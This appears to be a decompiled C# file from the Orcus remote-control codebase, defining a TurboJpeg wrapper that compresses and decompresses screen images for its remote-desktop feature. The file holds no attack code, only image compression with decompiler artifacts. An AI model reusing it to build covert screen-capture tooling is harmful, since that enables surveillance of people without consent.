using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using Orcus.Shared.Utilities.Compression;
using TurboJpegWrapper;

namespace Orcus.Commands.RemoteDesktop.Compression;

public class TurboJpgImageCompression : IDisposable, IImageCompression
{
	private readonly bool _decompress;

	private readonly TJCompressor _compressor;

	private readonly TJDecompressor _decompressor;

	public int Quality { get; set; }

	public CompressionMode CompressionMode { get; } = (CompressionMode)1;


	public DecompressionMode DecompressionMode { get; } = (DecompressionMode)5;


	public TurboJpgImageCompression(bool decompress)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		_decompress = decompress;
		if (decompress)
		{
			_decompressor = new TJDecompressor();
		}
		else
		{
			_compressor = new TJCompressor();
		}
	}

	public void Dispose()
	{
		if (_decompress)
		{
			_decompressor.Dispose();
		}
		else
		{
			_compressor.Dispose();
		}
	}

	public void Compress(IntPtr scan0, int stride, Size imageSize, PixelFormat pixelFormat, Stream outStream)
	{
		throw new NotImplementedException();
	}

	public void Compress(Bitmap bitmap, Stream outStream)
	{
		throw new NotImplementedException();
	}

	public byte[] Compress(IntPtr scan0, int stride, Size imageSize, PixelFormat pixelFormat)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		return _compressor.Compress(scan0, stride, imageSize.Width, imageSize.Height, pixelFormat, (TJSubsamplingOptions)0, Quality, (TJFlags)2048);
	}

	public void Decompress(IntPtr dataPtr, uint length, IntPtr outputPtr, int outputLength, PixelFormat pixelFormat)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		_decompressor.Decompress(dataPtr, (ulong)length, outputPtr, outputLength, ConvertPixelFormat(pixelFormat), (TJFlags)0, ref num, ref num2, ref num3);
	}

	public byte[] Decompress(IntPtr dataPtr, uint length, PixelFormat pixelFormat)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		return _decompressor.Decompress(dataPtr, (ulong)length, ConvertPixelFormat(pixelFormat), (TJFlags)2048, ref num, ref num2, ref num3);
	}

	public Bitmap Decompress()
	{
		throw new NotImplementedException();
	}

	private static TJPixelFormats ConvertPixelFormat(PixelFormat pixelFormat)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Invalid comparison between Unknown and I4
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Invalid comparison between Unknown and I4
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Invalid comparison between Unknown and I4
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		if ((int)pixelFormat != 137224)
		{
			if ((int)pixelFormat != 198659)
			{
				if ((int)pixelFormat == 2498570)
				{
					return (TJPixelFormats)8;
				}
				throw new NotSupportedException($"Provided pixel format \"{pixelFormat}\" is not supported");
			}
			return (TJPixelFormats)6;
		}
		return (TJPixelFormats)1;
	}
}
